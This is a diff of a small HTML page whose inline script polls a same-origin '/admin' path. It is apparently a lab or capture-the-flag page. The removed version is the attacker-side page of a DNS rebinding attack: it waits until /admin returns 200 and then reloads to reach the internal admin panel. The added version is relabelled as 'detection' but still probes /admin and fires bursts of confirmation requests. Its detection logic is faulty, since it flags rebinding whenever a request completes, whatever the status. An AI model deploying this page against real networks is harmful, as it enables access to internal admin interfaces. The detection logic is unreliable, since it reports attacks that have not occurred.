@@ -2,7 +2,7 @@
 <body>
 Ciao ciao!
 <script>
-// DNS Rebinding Attack Detection Script with Auto-Reload
+// DNS Rebinding Attack Detection Script
 (function() {
     'use strict';
     
@@ -24,7 +24,6 @@ Ciao ciao!
         z-index: 10000;
         border-radius: 5px;
         box-shadow: 0 2px 10px rgba(0,0,0,0.2);
-        max-width: 300px;
     `;
     
     function updateStatus(message, color = '#333') {
@@ -42,13 +41,6 @@ Ciao ciao!
     updateStatus('Starting monitoring...', '#0066cc');
     document.body.appendChild(statusDiv);
     
-    function reloadPage() {
-        updateStatus('Reloading page to access admin panel...', '#ff0000');
-        setTimeout(() => {
-            window.location.reload();
-        }, 1000); // Wait 1 second to show the message before reloading
-    }
-    
     async function checkAdminResource() {
         if (attackDetected || attemptCount >= maxAttempts) {
             return;
@@ -57,9 +49,10 @@ Ciao ciao!
         attemptCount++;
         
         try {
-            // Use fetch with cors mode to actually read the response status
+            const startTime = performance.now();
             const response = await fetch('/admin', {
                 method: 'GET',
+                mode: 'no-cors',
                 cache: 'no-cache',
                 headers: {
                     'Cache-Control': 'no-cache',
@@ -67,30 +60,72 @@ Ciao ciao!
                 }
             });
             
-            // Check if we got a successful response (200-299 status)
-            if (response.ok) {
+            const endTime = performance.now();
+            const responseTime = endTime - startTime;
+            
+            // Since we're using no-cors, we can't read the response status
+            // But we can detect successful connection
+            updateStatus(`Checking... (${attemptCount}/${maxAttempts})<br>Response time: ${responseTime.toFixed(2)}ms`, '#0066cc');
+            
+            // If we get here without an error, the request completed
+            // This could indicate the rebinding has occurred
+            if (attemptCount > 1) { // Ignore first attempt
                 attackDetected = true;
-                updateStatus('SUCCESS! Admin resource accessible<br>Reloading page...', '#00aa00');
+                updateStatus('DNS REBINDING DETECTED!<br>Admin resource may be accessible', '#ff0000');
                 
-                // Visual confirmation
-                statusDiv.style.background = '#e8f5e8';
-                statusDiv.style.borderColor = '#00aa00';
+                // Make it very visible
+                statusDiv.style.background = '#ffebee';
+                statusDiv.style.borderColor = '#ff0000';
+                statusDiv.style.animation = 'blink 1s infinite';
                 
-                // Reload the page to show the admin interface
-                reloadPage();
-                return;
-            } else {
-                // Got a response but not 200 (likely 404)
-                updateStatus(`Admin not accessible yet (${attemptCount}/${maxAttempts})<br>Status: ${response.status}`, '#ff9900');
+                // Add blinking animation
+                const style = document.createElement('style');
+                style.textContent = `
+                    @keyframes blink {
+                        0% { opacity: 1; }
+                        50% { opacity: 0.7; }
+                        100% { opacity: 1; }
+                    }
+                `;
+                document.head.appendChild(style);
+                
+                // Try to access admin panel multiple times to confirm
+                confirmAttack();
             }
             
         } catch (error) {
-            // Network error - can't reach the resource
             updateStatus(`Blocked/Error (${attemptCount}/${maxAttempts})<br>Waiting for DNS rebinding...`, '#ff9900');
         }
     }
     
-    // Alternative method using XMLHttpRequest to read status
+    async function confirmAttack() {
+        // Try multiple rapid requests to confirm
+        for (let i = 0; i < 5; i++) {
+            try {
+                await fetch('/admin', {
+                    method: 'GET',
+                    mode: 'no-cors',
+                    cache: 'no-cache'
+                });
+                await new Promise(resolve => setTimeout(resolve, 200));
+            } catch (e) {
+                // Ignore errors in confirmation phase
+            }
+        }
+    }
+    
+    // Start checking
+    const intervalId = setInterval(checkAdminResource, checkInterval);
+    
+    // Stop after max attempts
+    setTimeout(() => {
+        if (!attackDetected) {
+            clearInterval(intervalId);
+            updateStatus('Monitoring stopped<br>No rebinding detected', '#666');
+        }
+    }, maxAttempts * checkInterval);
+    
+    // Also try with XMLHttpRequest as backup
     function xhrCheck() {
         if (attackDetected) return;
         
@@ -98,18 +133,11 @@ Ciao ciao!
         xhr.timeout = 5000;
         
         xhr.onload = function() {
-            if (attackDetected) return;
-            
-            // Check if status is 200
-            if (xhr.status === 200) {
+            if (!attackDetected) {
                 attackDetected = true;
-                updateStatus('SUCCESS! (XHR) Admin resource accessible<br>Reloading page...', '#00aa00');
-                statusDiv.style.background = '#e8f5e8';
-                statusDiv.style.borderColor = '#00aa00';
-                reloadPage();
-            } else {
-                // Not 200 status
-                console.log(`XHR Status: ${xhr.status}`);
+                updateStatus('DNS REBINDING DETECTED (XHR)!<br>Admin resource may be accessible', '#ff0000');
+                statusDiv.style.background = '#ffebee';
+                statusDiv.style.borderColor = '#ff0000';
             }
         };
         
@@ -129,35 +157,8 @@ Ciao ciao!
         }
     }
     
-    // Start checking with fetch
-    const intervalId = setInterval(checkAdminResource, checkInterval);
-    
-    // Also run XHR checks as backup
-    setInterval(xhrCheck, 1500);
-    
-    // Stop after max attempts
-    setTimeout(() => {
-        if (!attackDetected) {
-            clearInterval(intervalId);
-            updateStatus('Monitoring stopped<br>No rebinding detected', '#666');
-        }
-    }, maxAttempts * checkInterval);
-    
-    // Add CSS for animations
-    const style = document.createElement('style');
-    style.textContent = `
-        @keyframes blink {
-            0% { opacity: 1; }
-            50% { opacity: 0.7; }
-            100% { opacity: 1; }
-        }
-        .success-flash {
-            animation: blink 0.5s infinite;
-            background: #e8f5e8 !important;
-            border-color: #00aa00 !important;
-        }
-    `;
-    document.head.appendChild(style);
+    // Run XHR checks less frequently to avoid too much noise
+    setInterval(xhrCheck, 5000);
     
 })();
 </script>
